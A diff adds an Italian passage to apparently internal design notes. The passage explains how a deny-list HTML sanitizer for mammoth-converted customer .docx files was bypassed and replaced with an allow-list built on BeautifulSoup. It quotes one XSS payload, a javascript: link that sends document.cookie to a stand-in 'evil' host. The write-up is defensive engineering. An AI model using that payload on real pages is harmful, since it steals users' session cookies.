@@ -42,6 +42,25 @@ Word non gliele dà, e Word non è una dipendenza. Quindi due colonne di
 questa non è l'impaginazione, il documento che consegni non sarà così.
 Senza quella riga la funzione inganna.
 
+**E quell'HTML non è nostro.** Va in pagina con `innerHTML`, ma il `.docx`
+da cui viene l'ha scritto un cliente. La prima ripulitura era una lista di
+cose vietate — via `<script>`, via gli attributi `on*=` — e mammoth in
+effetti non produce script. Ma i **collegamenti** li produce, e dove punta
+un collegamento lo decide chi ha scritto il file: un `.docx` con un
+`Target="javascript:…"` produceva
+`<a href="javascript:fetch('http://evil/'+document.cookie)">`, che passava
+indenne da entrambe le regole. Un clic, e quel codice girava nella stessa
+origine che apre i documenti dell'utente — che per questo prodotto è il
+caso normale, non il caso limite.
+
+Quindi non si elenca ciò che è vietato: si tiene solo ciò che serve. L'HTML
+passa da un parser vero (BeautifulSoup, già nel pacchetto), sopravvivono gli
+elementi del contenuto e gli attributi che li descrivono, e negli indirizzi
+solo gli schemi che non eseguono niente — `http`, `https`, `mailto`, e i
+relativi. Un collegamento normale resta cliccabile; uno che esegue perde
+l'indirizzo e **tiene il testo**, perché il confronto prima/dopo deve
+restare leggibile.
+
 ### Il cancello bloccava la build che lo avrebbe fatto passare
 
 `test_installer` guardava il pacchetto già presente in `dist/` **dentro
